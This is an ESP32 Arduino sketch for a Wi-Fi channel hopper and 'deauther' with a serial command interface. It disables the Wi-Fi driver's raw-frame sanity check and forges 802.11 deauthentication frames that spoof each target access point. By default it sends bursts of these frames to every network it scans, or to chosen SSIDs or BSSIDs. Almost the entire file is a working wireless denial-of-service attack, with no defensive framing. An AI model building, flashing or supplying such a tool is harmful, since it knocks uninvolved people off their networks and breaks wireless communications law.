/*-------------------------------------------------------------------------
   Wi-Fi Channel Hopper + Deauther
   ESP32-S3 / ESP32-C3 – 2.4 GHz ONLY
   Full Serial Interface – Evil-Cardputer style
---------------------------------------------------------------------------*/

#include <WiFi.h>
#include "esp_wifi.h"

int RX_PIN = 6;
int TX_PIN = 7;

/* ---------------------------------------------------------------------------
   ---------------------------  Serial Routing  -----------------------------*/
HardwareSerial SerialUART(1); // GPIO 6/7
static String serialLine;

static void logPrintln() {
  Serial.println();
  SerialUART.println();
}
template <typename T> void logPrint(T v) {
  Serial.print(v);
  SerialUART.print(v);
}
template <typename T> void logPrintln(T v) {
  Serial.println(v);
  SerialUART.println(v);
}

/* ---------------------------------------------------------------------------
   -----------------------------  MAC History  ------------------------------*/
#define MAC_HISTORY_LEN 1
struct mac_addr { uint8_t b[6]; };

mac_addr mac_history[MAC_HISTORY_LEN] = {};
uint8_t mac_cursor = 0;

void save_mac(const uint8_t *mac) {
  memcpy(mac_history[mac_cursor].b, mac, 6);
  mac_cursor = (mac_cursor + 1) % MAC_HISTORY_LEN;
}

bool already_seen(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN; ++i)
    if (!memcmp(mac, mac_history[i].b, 6)) return true;
  return false;
}

void clear_mac_history() {
  memset(mac_history, 0, sizeof(mac_history));
  mac_cursor = 0;
  logPrintln(F("MAC history cleared."));
}

/* ---------------------------------------------------------------------------
   ------------------  Bypass IDF Frame Check  ------------------------------*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
  return (arg == 31337) ? 1 : 0;
}

/* ---------------------------------------------------------------------------
   ------------------  Security Type to String  -----------------------------*/
static const char* security_to_string(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
    default: return "UNKNOWN";
  }
}

/* ---------------------------------------------------------------------------
   ------------------------  Channels (2.4GHz)  -----------------------------*/
const uint8_t channelList2g[] = { 1,2,3,4,5,6,7,8,9,10,11,12,13 };
const size_t CHANNEL_2G_COUNT = sizeof(channelList2g) / sizeof(channelList2g[0]);

const size_t MAX_CHANNELS = 64;
uint8_t activeChannels[MAX_CHANNELS] = {};
size_t activeChannelCount = 0;
size_t channelIndex = 0;

static bool isAllowedChannel(uint8_t ch) {
  return (ch >= 1 && ch <= 13);
}

static bool channelInActive(uint8_t ch) {
  for (size_t i = 0; i < activeChannelCount; ++i)
    if (activeChannels[i] == ch) return true;
  return false;
}

static void resetActiveChannels() {
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < CHANNEL_2G_COUNT && activeChannelCount < MAX_CHANNELS; ++i)
    activeChannels[activeChannelCount++] = channelList2g[i];
}

static void addActiveChannel(uint8_t ch) {
  if (!isAllowedChannel(ch)) return;
  if (activeChannelCount >= MAX_CHANNELS) return;
  if (!channelInActive(ch))
    activeChannels[activeChannelCount++] = ch;
}

static void addChannelsFromList(const String &list, bool replaceAll) {
  if (replaceAll) {
    activeChannelCount = 0;
    channelIndex = 0;
  }

  String tmp = list;
  tmp.replace(" ", "");

  while (tmp.length() > 0) {
    int comma = tmp.indexOf(',');
    String token = (comma >= 0) ? tmp.substring(0, comma) : tmp;
    tmp = (comma >= 0) ? tmp.substring(comma + 1) : "";

    int dash = token.indexOf('-');
    int startCh = token.toInt();
    int endCh = startCh;

    if (dash >= 0) {
      startCh = token.substring(0, dash).toInt();
      endCh   = token.substring(dash + 1).toInt();
    }

    if (endCh < startCh) { int t = startCh; startCh = endCh; endCh = t; }

    for (int ch = startCh; ch <= endCh; ++ch)
      addActiveChannel((uint8_t)ch);
  }

  if (activeChannelCount == 0)
    resetActiveChannels();
}

/* ---------------------------------------------------------------------------
   ----------------------------  AP Storage  --------------------------------*/
#define MAX_APS 60
#define MAX_TARGET_BSSIDS 16
#define kMaxSsidLen 32

struct ApInfo {
  char ssid[kMaxSsidLen + 1];
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  wifi_auth_mode_t auth;
};

ApInfo lastScan[MAX_APS] = {};
size_t lastScanCount = 0;
unsigned long lastScanMs = 0;

ApInfo refScan[MAX_APS] = {};
size_t refScanCount = 0;
unsigned long refScanMs = 0;

/* ---------------------------------------------------------------------------
   --------------------------  Targeting  -----------------------------------*/
bool targetSSIDSet = false;
bool targetBSSIDSet = false;
String targetSSID;
uint8_t targetBSSID[6] = {};
uint8_t targetBSSIDList[MAX_TARGET_BSSIDS][6] = {};
size_t targetBSSIDCount = 0;

static bool targetMatch(const String &ssid, const uint8_t *bssid) {
  if (targetBSSIDCount > 0) {
    for (size_t i = 0; i < targetBSSIDCount; ++i)
      if (!memcmp(bssid, targetBSSIDList[i], 6)) return true;
    return false;
  }
  if (targetSSIDSet && ssid != targetSSID) return false;
  if (targetBSSIDSet && memcmp(bssid, targetBSSID, 6) != 0) return false;
  return true;
}

/* ---------------------------------------------------------------------------
   ---------------------------  Runtime Config  -----------------------------*/
bool scanRunning = true;
bool deauthEnabled = true;
bool manualScanPending = false;

unsigned long scanInterval = 50;
unsigned long historyReset = 30000;
unsigned long t_lastScan = 0;
unsigned long t_lastClear = 0;

/* ---------------------------------------------------------------------------
   -----------------------  Deauth Packet  ----------------------------------*/
void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t tpl[26] PROGMEM = {
    0xC0,0x00,0x3A,0x01,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00,0x00,
    0x07,0x00
  };

  uint8_t pkt[26];
  memcpy_P(pkt, tpl, sizeof(pkt));
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  digitalWrite(8, LOW);
  for (uint8_t i = 0; i < 10; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(10);
  }
  digitalWrite(8, HIGH);
}

/* ---------------------------------------------------------------------------
   ----------------------  Scan + Deauth Core  ------------------------------*/
static void performScan(bool allowDeauth) {
  if (activeChannelCount == 0) return;

  uint8_t ch = activeChannels[channelIndex];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  logPrint(F("Scanning channel: "));
  logPrintln(ch);

  int n = WiFi.scanNetworks(false, true, false, 500, ch);
  lastScanCount = 0;
  lastScanMs = millis();

  for (int i = 0; i < n && lastScanCount < MAX_APS; ++i) {
    String ssid = WiFi.SSID(i);
    const uint8_t *bssid = WiFi.BSSID(i);
    uint8_t realCh = WiFi.channel(i);

    if (!isAllowedChannel(realCh)) continue;
    if (!targetMatch(ssid, bssid)) continue;

    ApInfo &ap = lastScan[lastScanCount++];
    memset(ap.ssid, 0, sizeof(ap.ssid));
    ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
    memcpy(ap.bssid, bssid, 6);
    ap.rssi = WiFi.RSSI(i);
    ap.channel = realCh;
    ap.auth = WiFi.encryptionType(i);

    logPrint(F("AP: "));
    logPrint(ap.ssid);
    logPrint(F(" | "));
    logPrintln(WiFi.BSSIDstr(i));

    if (!allowDeauth) continue;
    if (already_seen(bssid)) continue;

    save_mac(bssid);
    sendDeauthPacket(bssid, realCh);
  }

  channelIndex = (channelIndex + 1) % activeChannelCount;
  t_lastScan = millis();
}

/* ---------------------------------------------------------------------------
   ---------------------------  Serial Commands  ----------------------------*/
static bool parseMac(const String &s, uint8_t out[6]) {
  int v[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6)
    return false;
  for (int i = 0; i < 6; ++i) out[i] = (uint8_t)v[i];
  return true;
}

static void printHelp() {
  logPrintln(F("HELP"));
  logPrintln(F("START | STOP"));
  logPrintln(F("SCAN | SCAN ALL"));
  logPrintln(F("LIST"));
  logPrintln(F("DEAUTH ON|OFF"));
  logPrintln(F("TARGET SSID <name>"));
  logPrintln(F("TARGET BSSID <aa:bb:cc:dd:ee:ff>"));
  logPrintln(F("TARGET INDEX <n,m-o>"));
  logPrintln(F("TARGET CLEAR"));
  logPrintln(F("CHAN SET <list> | ADD | CLEAR | RESET"));
  logPrintln(F("INTERVAL <ms>"));
  logPrintln(F("HISTORY <ms>"));
  logPrintln(F("CONFIG"));
}

static void listLastScan() {
  logPrintln(F("idx | ch | rssi | auth | bssid | ssid"));
  for (size_t i = 0; i < lastScanCount; ++i) {
    char buf[18];
    sprintf(buf,"%02X:%02X:%02X:%02X:%02X:%02X",
      lastScan[i].bssid[0],lastScan[i].bssid[1],lastScan[i].bssid[2],
      lastScan[i].bssid[3],lastScan[i].bssid[4],lastScan[i].bssid[5]);

    logPrint(i); logPrint(F(" | "));
    logPrint(lastScan[i].channel); logPrint(F(" | "));
    logPrint(lastScan[i].rssi); logPrint(F(" | "));
    logPrint(security_to_string(lastScan[i].auth)); logPrint(F(" | "));
    logPrint(buf); logPrint(F(" | "));
    logPrintln(lastScan[i].ssid);
  }
}

static void handleCommand(const String &line) {
  String cmd = line;
  cmd.trim();
  if (cmd.length() == 0) return;

  String upper = cmd;
  upper.toUpperCase();

  /* ---------------- BASIC ---------------- */
  if (upper == "HELP") {
    printHelp();
    return;
  }

  if (upper == "START") {
    scanRunning = true;
    t_lastClear = millis();
    logPrintln(F("Scan START"));
    return;
  }

  if (upper == "STOP") {
    scanRunning = false;
    logPrintln(F("Scan STOP"));
    return;
  }

  if (upper == "CONFIG") {
    logPrintln(F("=== Config ==="));
    logPrint(F("scanRunning: ")); logPrintln(scanRunning ? F("ON") : F("OFF"));
    logPrint(F("deauthEnabled: ")); logPrintln(deauthEnabled ? F("ON") : F("OFF"));
    logPrint(F("scanInterval(ms): ")); logPrintln(scanInterval);
    logPrint(F("historyReset(ms): ")); logPrintln(historyReset);
    logPrint(F("activeChannels("));
    logPrint(activeChannelCount);
    logPrint(F("): "));
    for (size_t i = 0; i < activeChannelCount; ++i) {
      logPrint(activeChannels[i]);
      if (i + 1 < activeChannelCount) logPrint(F(","));
    }
    logPrintln();
    logPrintln(F("================"));
    return;
  }

  if (upper == "LIST") {
    listLastScan();
    return;
  }

  /* ---------------- DEAUTH ---------------- */
  if (upper.startsWith("DEAUTH ")) {
    String arg = cmd.substring(7);
    arg.trim();
    arg.toUpperCase();
    deauthEnabled = (arg == "ON");
    logPrint(F("Deauth: "));
    logPrintln(deauthEnabled ? F("ON") : F("OFF"));
    return;
  }

  /* ---------------- TIMING ---------------- */
  if (upper.startsWith("INTERVAL ")) {
    scanInterval = (unsigned long)cmd.substring(9).toInt();
    logPrintln(F("scanInterval updated."));
    return;
  }

  if (upper.startsWith("HISTORY ")) {
    historyReset = (unsigned long)cmd.substring(8).toInt();
    logPrintln(F("historyReset updated."));
    return;
  }

  /* ---------------- CHANNELS ---------------- */
  if (upper == "CHAN RESET") {
    resetActiveChannels();
    logPrintln(F("Channels reset."));
    return;
  }

  if (upper == "CHAN CLEAR") {
    activeChannelCount = 0;
    channelIndex = 0;
    logPrintln(F("Channels cleared."));
    return;
  }

  if (upper.startsWith("CHAN SET ")) {
    addChannelsFromList(cmd.substring(9), true);
    logPrintln(F("Channels set."));
    return;
  }

  if (upper.startsWith("CHAN ADD ")) {
    addChannelsFromList(cmd.substring(9), false);
    logPrintln(F("Channels added."));
    return;
  }

  /* ---------------- SCAN ---------------- */
  if (upper == "SCAN") {
    manualScanPending = true;
    logPrintln(F("Manual scan requested."));
    return;
  }

  if (upper == "SCAN ALL") {
    logPrintln(F("Reference scan (SCAN ALL)"));
    refScanCount = 0;
    refScanMs = millis();

    int n = WiFi.scanNetworks(false, true, false, 800, 0);
    for (int i = 0; i < n && refScanCount < MAX_APS; ++i) {
      uint8_t ch = WiFi.channel(i);
      if (!isAllowedChannel(ch)) continue;

      ApInfo &ap = refScan[refScanCount++];
      memset(ap.ssid, 0, sizeof(ap.ssid));
      WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
      memcpy(ap.bssid, WiFi.BSSID(i), 6);
      ap.rssi = WiFi.RSSI(i);
      ap.channel = ch;
      ap.auth = WiFi.encryptionType(i);
    }

    lastScanCount = 0;
    for (size_t i = 0; i < refScanCount && lastScanCount < MAX_APS; ++i)
      lastScan[lastScanCount++] = refScan[i];

    lastScanMs = refScanMs;
    listLastScan();
    return;
  }

  /* ---------------- TARGET ---------------- */
  if (upper == "TARGET CLEAR") {
    targetSSIDSet = false;
    targetBSSIDSet = false;
    targetSSID = "";
    targetBSSIDCount = 0;
    logPrintln(F("Targets cleared."));
    return;
  }

  if (upper.startsWith("TARGET SSID ")) {
    targetSSID = cmd.substring(12);
    targetSSID.trim();
    targetSSIDSet = (targetSSID.length() > 0);
    targetBSSIDSet = false;
    targetBSSIDCount = 0;
    logPrint(F("Target SSID: "));
    logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
    return;
  }

  if (upper.startsWith("TARGET BSSID ")) {
    String mac = cmd.substring(13);
    mac.trim();
    if (parseMac(mac, targetBSSID)) {
      targetBSSIDSet = true;
      targetBSSIDCount = 0;
      logPrintln(F("Target BSSID set."));
    } else {
      logPrintln(F("Invalid BSSID format."));
    }
    return;
  }

  logPrintln(F("Unknown command. Type HELP."));
}


/* ---------------------------------------------------------------------------
   -------------------------------  Setup  ----------------------------------*/
void setup() {
  Serial.begin(115200);
  pinMode(8, OUTPUT);  // LED interne
  SerialUART.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);

  WiFi.mode(WIFI_STA);
  resetActiveChannels();

  logPrintln(F("ESP32-S3/C3 Deauther ready (2.4GHz only)"));
  printHelp();
}


/* ---------------------------------------------------------------------------
   -------------------------------- Loop -----------------------------------*/
void loop() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      serialLine.trim();
      if (serialLine.length()) handleCommand(serialLine);
      serialLine = "";
    } else if (serialLine.length() < 200) serialLine += c;
  }

  while (SerialUART.available()) {
    char c = (char)SerialUART.read();
    if (c == '\n' || c == '\r') {
      serialLine.trim();
      if (serialLine.length()) handleCommand(serialLine);
      serialLine = "";
    } else if (serialLine.length() < 200) serialLine += c;
  }

  if (scanRunning && millis() - t_lastClear > historyReset) {
    clear_mac_history();
    t_lastClear = millis();
  }

  if (manualScanPending) {
    manualScanPending = false;
    performScan(false);
  }

  if (scanRunning && millis() - t_lastScan > scanInterval) {
    performScan(deauthEnabled);
  }
}
